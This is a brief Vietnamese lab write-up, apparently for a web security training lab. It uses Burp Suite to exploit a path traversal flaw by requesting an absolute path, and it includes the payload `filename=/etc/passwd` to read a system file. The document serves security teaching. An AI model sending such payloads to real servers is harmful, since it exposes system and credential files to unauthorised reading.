# File path traversal, traversal sequences blocked with absolute path bypass

Mở lab trong Burp Suite, bật Intercept: On.

Bắt request có header tương tự `GET /image?filename=___.jpg HTTP/2`

<img width="1029" height="540" alt="image" src="https://github.com/user-attachments/assets/c3347a14-683d-43a6-9869-aa3e021679bd" />

Gửi request vào Repeater (Right-click -> Send to repeater).

Thử payload:

```
GET /image?filename=/etc/passwd HTTP/2
```
<img width="1028" height="572" alt="image" src="https://github.com/user-attachments/assets/b25f9498-0cc0-4e66-a586-9c25b31b6b1c" />

Quay lai tab Proxy, sửa tương tự và Send Request là xong!
